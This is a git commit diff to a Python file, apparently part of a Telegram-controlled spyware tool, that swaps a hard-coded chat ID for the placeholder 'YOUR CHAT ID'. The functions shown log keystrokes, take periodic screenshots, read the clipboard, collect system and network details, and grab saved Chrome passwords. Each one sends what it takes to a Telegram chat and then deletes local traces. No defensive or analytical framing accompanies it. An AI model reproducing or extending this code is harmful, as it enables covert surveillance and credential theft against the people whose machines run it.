60e92874e944a9545e8b2dd96e97132b20732b5f
Your Name <you@example.com>
2025-03-10 11:40:30 +0100

    Ultimos Errores corregidos

--- funciones_asyncronas.py
+++ funciones_asyncronas.py
@@ -10,7 +10,7 @@ async def capturar_teclas(bot):
         await asyncio.sleep(5)
         if llista_teclas:
             try:
-                await bot.send_message(chat_id="817416698", text="\n".join(llista_teclas))
+                await bot.send_message(chat_id="YOUR CHAT ID", text="\n".join(llista_teclas))
                 llista_teclas.clear()
             except Exception as e:
                 registro_errores(f"Error sending key presses: {e}")
@@ -20,7 +20,7 @@ async def capture_screenshots(bot):
         await asyncio.sleep(15)
         try:
             screenshot_path = capture_screenshot()
-            await bot.send_photo(chat_id="817416698", photo=open(screenshot_path, 'rb'))
+            await bot.send_photo(chat_id="YOUR CHAT ID", photo=open(screenshot_path, 'rb'))
             os.remove(screenshot_path)
         except Exception as e:
             registro_errores(f"Error capturing and sending the screen: {e}")
@@ -32,17 +32,17 @@ async def log_clipboard(bot):
         current_content = get_clipboard_content()
         if current_content != previous_content:
             previous_content = current_content
-            await bot.send_message(chat_id="817416698", text=f"Clipboard content: {current_content}") 
+            await bot.send_message(chat_id="YOUR CHAT ID", text=f"Clipboard content: {current_content}") 
 
 async def especificaciones_sistema(bot):
     await asyncio.sleep(0.001)
     especificaciones = obtener_especificaciones_sistema()
-    await bot.send_message(chat_id="817416698", text=f"{especificaciones}") 
+    await bot.send_message(chat_id="YOUR CHAT ID", text=f"{especificaciones}") 
 
 async def informacion_red(bot):
     await asyncio.sleep(0.001)
     informacion_red = obtener_informacion_red()
-    await bot.send_message(chat_id="817416698", text=f"{informacion_red}")
+    await bot.send_message(chat_id="YOUR CHAT ID", text=f"{informacion_red}")
         
 async def passwords(bot):
     await asyncio.sleep(0.003)
@@ -50,7 +50,7 @@ async def passwords(bot):
     password_path = get_chrome_passwords()
     #Envia el archivo cookies.json al chat
     try:
-        await bot.send_document(chat_id="817416698", document=open(password_path, "rb"))
+        await bot.send_document(chat_id="YOUR CHAT ID", document=open(password_path, "rb"))
         await asyncio.sleep(1)
         os.remove(password_path)
     except Exception as e:
